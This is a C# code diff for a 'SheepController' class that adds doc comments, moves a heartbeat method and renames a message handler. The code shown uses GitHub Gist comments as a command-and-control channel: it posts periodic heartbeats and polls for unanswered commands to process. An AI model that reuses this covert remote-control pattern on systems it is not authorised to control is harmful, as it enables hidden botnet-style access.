@@ -4,6 +4,9 @@ using Pasture.Messages;
 
 namespace Sheep.Core;
 
+/// <summary>
+/// Class <c>SheepController</c> Sheep main controller
+/// </summary>
 public class SheepController
 {
     private GitHubClient _client;
@@ -24,13 +27,10 @@ public class SheepController
         SheepId = sheepId;
         _client = ConnectGitHubClient();
     }
-
-    private void SendHeartBeat(object? state)
-    {
-        var message = new HeartBeatMessage(DateTimeOffset.UtcNow);
-        _client.Gist.Comment.Create(_gistId, message.GetTransportFormat());
-    }
-
+    
+    /// <summary>
+    /// Method <c>ConnectGitHubClient</c> Handles connection to Github API.
+    /// </summary>
     private GitHubClient ConnectGitHubClient()
     {
         var client = new GitHubClient(new ProductHeaderValue($"sheep"));
@@ -41,6 +41,18 @@ public class SheepController
         return client;
     }
 
+    /// <summary>
+    /// Method <c>SendHeartBeat</c> Sends heartbeat message to the gist.
+    /// </summary>
+    private void SendHeartBeat(object? state)
+    {
+        var message = new HeartBeatMessage(DateTimeOffset.UtcNow);
+        _client.Gist.Comment.Create(_gistId, message.GetTransportFormat());
+    }
+
+    /// <summary>
+    /// Method <c>Start</c> Starts the control gist flow.
+    /// </summary>
     public async Task Start()
     {
         //Try to find existing hub gist
@@ -75,7 +87,10 @@ public class SheepController
 
         _heartBeatTimer = new Timer(SendHeartBeat, null, 0, 1000 * 60 * 15);
     }
-
+    
+    /// <summary>
+    /// Method <c>TryReceiveMessage</c> Tries to receive and process not yet processed message
+    /// </summary>
     public async Task TryReceiveMessage()
     {
         var comments = await _client.Gist.Comment.GetAllForGist(_gistId);
@@ -84,12 +99,15 @@ public class SheepController
         {
             if (CommandMessage.TryParse(comment.Body, out var commandMessage) && !commandMessage.Answered)
             {
-                await ProcessMessage(commandMessage, comment.Id);
+                await ProcessMessageAndRespond(commandMessage, comment.Id);
             }
         }
     }
 
-    private async Task ProcessMessage(CommandMessage commandMessage, int commentId)
+    /// <summary>
+    /// Method <c>ProcessMessage</c> Process receive message and respond
+    /// </summary>
+    private async Task ProcessMessageAndRespond(CommandMessage commandMessage, int commentId)
     {
         string response;
         ResponseMessage responseMessage;
